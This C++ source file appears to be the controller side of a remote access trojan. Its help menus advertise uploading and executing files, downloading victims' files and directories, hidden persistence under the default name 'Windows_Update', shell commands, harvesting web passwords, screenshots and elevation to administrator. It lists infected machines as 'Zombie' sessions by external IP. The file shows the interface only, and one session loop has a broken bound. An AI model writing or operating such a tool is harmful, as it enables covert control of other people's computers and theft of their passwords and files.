//#include "pch.h"
#include "Scripts_s.h"


void Info::list_scripts()
{
	SetColor(2);
	std::cout << "[\t\t------------ List of all scripts ------------" << std::endl;
	SetColor(14);
	std::cout << "#---------------------------- Usefull ----------------------------#" << std::endl;
	SetColor(6);
	std::cout << "[ upload \"filename\"\t\t\t: upload a file in the current directory" << std::endl;
	std::cout << "[ upload_exe \"filename\"\t\t\t: upload and exe a file in the current directory" << std::endl;
	std::cout << "[ download \"filename\"\t\t\t: download the file's target wanted" << std::endl;
	std::cout << "[ download_dir \"filename\"\t\t: download the target directory" << std::endl;
	std::cout << "[ self_persistence <keyname>\t\t: Put a persistence on the payload" << std::endl;
	std::cout << "[ default name is Windows_Update" << std::endl;
	std::cout << "[ persistence <file_name> <keyname>\t: Put a persistence on a given file" << std::endl;
	std::cout << "[ default keyname is Windows_Update" << std::endl;
	std::cout << "[ shell <command>\t\t\t: Run a shell command" << std::endl;
	SetColor(14);
	std::cout << "#---------------------------- Exploit ---------------------------#" << std::endl;
	SetColor(6);
	std::cout << "[ geo\t\t\t\t: Give the localization of the current session" << std::endl;
	std::cout << "[ enum_web\t\t\t: enum all web passwords on the current session" << std::endl;
	std::cout << "[ screenshot <name>\t\t: Take a screenshot from the current target screen" << std::endl;
	std::cout << "[ ask <exe> <name>\t\t: Upload and execute a given file as administrator" << std::endl;
	std::cout << "[ you can choose a new file_name, default is Windows_Update.exe" << std::endl;


	SetColor(7);
}

void Info::print_help()
{
	SetColor(2);
	std::cout << "[*] You have now acces to the payload\n" << std::endl;
	std::cout << "[\t\t------------ List of Commands ------------\t\t]" << std::endl;
	SetColor(6);
	std::cout << "[ help\t\t\t: list all commands" << std::endl;
	std::cout << "[ list_scripts\t\t: List all scripts available" << std::endl;
	std::cout << "[ version\t\t: print the current version and changes" << std::endl;
	std::cout << "[ getsysinfo\t\t: Give information about the current session (user ...)" << std::endl;
	std::cout << "[ getip\t\t\t: Give the External IP address of the current session" << std::endl;
	std::cout << "[ set_session\t\t: Switch to an another session" << std::endl;
	std::cout << "[ list\t\t\t: list all actives sessions" << std::endl;
	std::cout << "[ pwd\t\t\t: print the trojan emplacement" << std::endl;
	std::cout << "[ ls\t\t\t: see all files at the current directory" << std::endl;
	std::cout << "[ exit\t\t\t: exit the program" << std::endl;
	SetColor(7);
}

 bool Info::set_session(Server* server)
{
	int nb;
	server->send_b("[*] Please enter the number of the session : ");
	std::cin >> nb;
	std::vector<st_Client> clients = server->getClients();
	for (int i = 0; clients.size(); i++)
	{
		if (clients[i].number == nb)
		{
			server->setDefaultClient(server->getClients()[i]);
			server->send_b("[*] Done");
			return 1;
		}
	}
	server->send_b("[*] Can't find : ");
	server->send_b(nb);
	return 0;

}

 void Info::list(Server* server)
{
	SetColor(6);
	std::cout << "[*] Enumming clients..." << std::endl;
	SetColor(2);
	std::vector<st_Client> clients = server->getClients();
	for (int i = 0; i < clients.size(); i++)
	{
		std::cout << "Zombie " << clients[i].number << " Ip : " << clients[i].ip_extern <<  std::endl;
	}
	SetColor(7);

}

void Info::getsysinfo(Server* server)
{
	std::stringstream ss;

}

